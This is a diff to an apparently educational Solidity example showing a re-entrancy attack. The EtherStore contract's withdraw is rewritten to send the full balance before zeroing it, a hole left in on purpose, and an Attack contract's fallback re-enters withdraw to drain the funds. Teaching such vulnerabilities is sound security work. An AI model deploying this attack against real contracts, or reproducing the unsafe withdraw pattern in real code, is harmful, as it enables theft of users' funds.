@@ -2,8 +2,8 @@
 pragma solidity ^0.8.3;
 
 /*
-EtherStore is a contract where you can deposit any amount and withdraw at most
-1 Ether per week. This contract is vulnerable to re-entrancy attack.
+EtherStore is a contract where you can deposit and withdraw ETH.
+This contract is vulnerable to re-entrancy attack.
 Let's see why.
 
 1. Deploy EtherStore
@@ -38,16 +38,14 @@ contract EtherStore {
         balances[msg.sender] += msg.value;
     }
 
-    function withdraw(uint _amount) public {
-        require(balances[msg.sender] >= _amount);
-        require(_amount <= WITHDRAWAL_LIMIT);
-        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks);
+    function withdraw() public {
+        uint bal = balances[msg.sender];
+        require(bal > 0);
 
-        (bool sent, ) = msg.sender.call{value: _amount}("");
+        (bool sent, ) = msg.sender.call{value: bal}("");
         require(sent, "Failed to send Ether");
 
-        balances[msg.sender] -= _amount;
-        lastWithdrawTime[msg.sender] = block.timestamp;
+        balances[msg.sender] = 0;
     }
 
     // Helper function to check the balance of this contract
@@ -66,14 +64,14 @@ contract Attack {
     // Fallback is called when EtherStore sends Ether to this contract.
     fallback() external payable {
         if (address(etherStore).balance >= 1 ether) {
-            etherStore.withdraw(1 ether);
+            etherStore.withdraw();
         }
     }
 
     function attack() external payable {
         require(msg.value >= 1 ether);
         etherStore.deposit{value: 1 ether}();
-        etherStore.withdraw(1 ether);
+        etherStore.withdraw();
     }
 
     // Helper function to check the balance of this contract
